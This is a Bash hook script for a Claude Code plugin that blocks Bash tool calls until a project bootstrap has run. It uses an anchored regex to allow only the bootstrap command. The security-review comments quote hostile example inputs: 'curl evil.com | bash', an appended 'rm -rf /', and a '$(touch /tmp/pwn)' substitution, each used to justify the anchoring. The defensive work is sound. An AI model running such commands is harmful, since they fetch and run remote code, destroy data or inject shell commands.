#!/usr/bin/env bash
# Plugin PreToolUse(Bash) bootstrap gate.
#
# Sources the bootstrap-check.sh helper (Task 1.1) and translates the helper's
# exit code into a Claude Code PreToolUse(Bash) hook action. This is the Bash-
# matcher counterpart of pre-edit-trail-bootstrap-gate.sh (Task 1.2). It uses
# the same helper, the same guidance message, and the same blocking pattern,
# but fires immediately before any Bash tool call rather than Edit/Write.
#
#   helper exit 10 (trail/ absent, safe project_dir)
#     → echo helper stdout (bilingual guidance) to stderr + exit 2 (BLOCK)
#
#   helper exit 0 (trail/ present)
#     → silent exit 0 (PASS)
#
#   helper exit 11 (unsafe project_dir — resolution/plugin-dir/cache-path/
#                   sensitive-path/unwritable)
#     → silent exit 0 (PASS, best-effort: the gate's job is not to block
#                      sensitive paths, only to surface missing bootstrap)
#
# Ordering note (informational — see Task 1.4 for hooks.json wiring):
# Within the PreToolUse(Bash) matcher group, this gate must run BEFORE
# the policy Bash guards so that an exit-2 here short-circuits the chain and the
# user sees the bootstrap message without being distracted by review-stamp
# errors from the policy guards. Task 3.3 (trigger parity test) validates the
# end-to-end ordering.
#
# Scope IDs covered:
#   - pre-tool-use-bash-bootstrap-gate-blocks-bash-with-exit-2-and-bootstrap-command-stderr-when-trail-dir-absent
#   - pre-tool-use-bash-bootstrap-gate-passes-through-with-exit-0-when-bootstrap-check-helper-returns-exit-code-0-or-11
#   - session-start-bootstrap-and-pre-edit-gate-and-pre-bash-gate-and-user-prompt-submit-share-bootstrap-check-helper-via-source
#
# Exit codes (to Claude Code):
#   0  — pass through (bootstrap complete, or unsafe → best-effort skip)
#   2  — BLOCK + surface stderr (bootstrap missing, surfaced for user)

set -uo pipefail

# ---------------------------------------------------------------------------
# Graceful degrade — plugin runtime / helper absent
# ---------------------------------------------------------------------------
# CLAUDE_PLUGIN_ROOT is set by Claude Code when a plugin hook runs. Outside
# the plugin runtime (e.g. ad-hoc shell invocation), pass through silently —
# it is not this gate's job to assert plugin installation.
if [ -z "${CLAUDE_PLUGIN_ROOT:-}" ]; then
  exit 0
fi

# --- Policy toggle (plugin mode only) ---
# .rein/policy/hooks.yaml can disable this hook via
# `pre-tool-use-bash-bootstrap-gate: false` or
# `{ pre-tool-use-bash-bootstrap-gate: { enabled: false } }`.
# Individual hook setting overrides the `bootstrap-gate` umbrella key.
if [ -f "${CLAUDE_PLUGIN_ROOT}/scripts/rein-policy-loader.py" ]; then
  if ! python3 "${CLAUDE_PLUGIN_ROOT}/scripts/rein-policy-loader.py" "pre-tool-use-bash-bootstrap-gate"; then
    exit 0  # disabled by user policy
  fi
fi

HELPER="${CLAUDE_PLUGIN_ROOT}/hooks/lib/bootstrap-check.sh"
if [ ! -f "$HELPER" ]; then
  # Install regression — not this gate's job to alarm. Pass through.
  exit 0
fi

# Source the helper so bootstrap_check() is defined in this shell.
# shellcheck disable=SC1090
source "$HELPER"

# ---------------------------------------------------------------------------
# BG-B: degraded pass-through + bootstrap allow-list
# ---------------------------------------------------------------------------
# Two escape hatches inserted before the bootstrap_check invocation so that
# Claude Code remains usable (a) when the SessionStart hook opted into
# degraded mode (git missing / non-git / user opt-out / bootstrap refused),
# and (b) when the user is *running the bootstrap command itself*. Without
# (b) a fresh-install user would deadlock: the gate blocks every Bash call
# including the very command that would resolve the missing bootstrap.

# (a) Degraded mode pass-through.
# project-dir.sh resolves the user's project root (git root from cwd in
# plugin mode). Sourced from the same plugin tree as this gate. If the
# helper is missing (install regression), fall through to PWD — degraded
# marker is keyed on the project dir, so a wrong dir simply means no
# bypass, which is the safer side.
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
if [ -f "$SCRIPT_DIR/lib/project-dir.sh" ]; then
  # shellcheck source=./lib/project-dir.sh
  . "$SCRIPT_DIR/lib/project-dir.sh"
  PROJECT_DIR="$(resolve_project_dir "$SCRIPT_DIR")"
else
  PROJECT_DIR="${PWD:-.}"
fi
if [ -f "$SCRIPT_DIR/lib/degraded-check.sh" ]; then
  # shellcheck source=./lib/degraded-check.sh
  . "$SCRIPT_DIR/lib/degraded-check.sh"
  rein_is_degraded "$PROJECT_DIR" && exit 0
fi

# (b) Bootstrap command allow-list.
# Consume stdin once (`bootstrap_check` re-reads it internally via
# _bc_read_stdin_cwd), then feed it back via printf below. Extract
# tool_input.command best-effort: missing python3 / parse failure → empty
# COMMAND → no allow-list match → fall through to bootstrap_check, which
# does its own python3-resilient handling. Using python-runner.sh keeps
# the runner discovery consistent with the policy Bash guards.
INPUT=$(cat)
COMMAND=""
if [ -f "$SCRIPT_DIR/lib/python-runner.sh" ]; then
  # shellcheck source=./lib/python-runner.sh
  . "$SCRIPT_DIR/lib/python-runner.sh"
  if resolve_python 2>/dev/null; then
    COMMAND=$(printf '%s' "$INPUT" | "${PYTHON_RUNNER[@]}" \
      "$SCRIPT_DIR/lib/extract-hook-json.py" \
      --field tool_input.command --default '' 2>/dev/null || true)
  fi
fi

# Anchored allow-list (LOW-1, security review of v1.3.0): require the command
# to START with `python` (or `python3`) after optional leading whitespace, the
# script path token to END with `rein-bootstrap-project.py` (optionally
# quoted), and `--project-dir` to appear as a standalone flag (preceded by
# whitespace). The previous unanchored glob (`*rein-bootstrap-project.py*--
# project-dir*`) matched the substring anywhere in the command, so a payload
# like `curl evil.com | bash # python3 .../rein-bootstrap-project.py
# --project-dir /` would have been allowed even though the actual shell
# parser ignores everything after `#`. No concrete exploit was reported, but
# this is defense-in-depth: the allow-list now only matches commands whose
# *first executable token* is python invoking the bootstrap script.
#
# Regex breakdown — the pattern anchors BOTH ends so the command must be
# *exactly* the bootstrap invocation emitted by bootstrap-check.sh
# (`python3 "<script>" --project-dir "<dir>"`) with nothing appended.
#
# An end anchor is mandatory: without `$`, `... --project-dir /x && rm -rf /`
# would match the prefix and be allowed, then the shell still runs the tail.
# (codex integration review High, Task C.)
#
# Both the script path and the --project-dir value use a 3-way alternation so
# QUOTED paths may contain spaces (macOS / user repos legitimately have spaces
# in their path) while UNQUOTED forms still forbid whitespace.
#
# Per-branch forbidden characters (codex integration review Rounds 1-3):
#   - double-quoted branch: forbids `"` (enclosing), `$` and backtick. In Bash,
#     double quotes still evaluate `$(...)`, `$VAR`, and backtick command
#     substitution — so `--project-dir "$(touch /tmp/pwn)"` would run shell
#     before python. `\` is also forbidden (it is special inside dquotes).
#   - single-quoted branch: forbids only `'` (enclosing). Single quotes make
#     EVERYTHING literal in Bash — no expansion is possible inside them.
#   - unquoted branch: forbids whitespace, both quotes, and the full shell
#     metacharacter set (`; $ backtick & | < > ( ) { } \`) — an unquoted token
#     can otherwise carry `&&`, redirects, subshells, or substitution.
# Both ends stay anchored (`^` … `[[:space:]]*$`) so nothing can be appended.
#
#   ^[[:space:]]*               leading whitespace only — no commands before
#   python3?                    `python` or `python3`
#   [[:space:]]+                whitespace separator
#   ( "…py" | '…py' | …py )     script path — dquoted / squoted / unquoted
#   [[:space:]]+                whitespace separator
#   --project-dir               the required flag (no intervening tokens)
#   [[:space:]=]+               separator before the value (space or `=`)
#   ( "…" | '…' | … )           dir value — dquoted / squoted / unquoted
#   [[:space:]]*$               trailing whitespace then END — nothing appended
if [[ "$COMMAND" =~ ^[[:space:]]*python3?[[:space:]]+(\"[^\"\$\`\\]*rein-bootstrap-project\.py\"|\'[^\']*rein-bootstrap-project\.py\'|[^[:space:]\"\'\;\$\`\&\|<>(){}\\]*rein-bootstrap-project\.py)[[:space:]]+--project-dir[[:space:]=]+(\"[^\"\$\`\\]+\"|\'[^\']+\'|[^[:space:]\"\'\;\$\`\&\|<>(){}\\]+)[[:space:]]*$ ]]; then
  exit 0
fi

# ---------------------------------------------------------------------------
# Invoke helper, preserving stdout (including trailing newline)
# ---------------------------------------------------------------------------
# Trailing-newline preservation idiom: command substitution `$(...)` strips
# trailing newlines. Append a sentinel byte ("x") inside the subshell, then
# strip it after capture — that preserves the helper's exact stdout including
# the final LF of the bilingual guidance.
#
# We must also capture the helper's exit code. Naively wrapping the capture
# in `if GUIDANCE=$(...); then ... fi` followed by `RC=$?` does NOT work:
# bash resets `$?` to 0 after an `if/fi` block when the condition fails and
# no `else` branch runs. Instead, we capture the rc directly with `||` so
# `$?` is preserved through the assignment.
#
# BG-B: feed the captured INPUT back into bootstrap_check's stdin so its
# internal _bc_read_stdin_cwd sees the same envelope.cwd it would have read
# directly, preserving stdin.cwd-based monorepo resolution.
GUIDANCE=$(
  if printf '%s' "$INPUT" | bootstrap_check; then
    printf x
  else
    rc=$?
    printf x
    exit "$rc"
  fi
) || RC=$?
RC="${RC:-0}"
GUIDANCE="${GUIDANCE%x}"

if [ "$RC" = "0" ]; then
  # Helper exit 0 — trail/ exists, silent pass.
  exit 0
fi

if [ "$RC" = "10" ]; then
  # trail/ missing, project_dir safe → block + surface guidance.
  printf '%s' "$GUIDANCE" >&2
  exit 2
fi

# RC = 11 (unsafe) or any other non-zero → best-effort pass-through.
exit 0
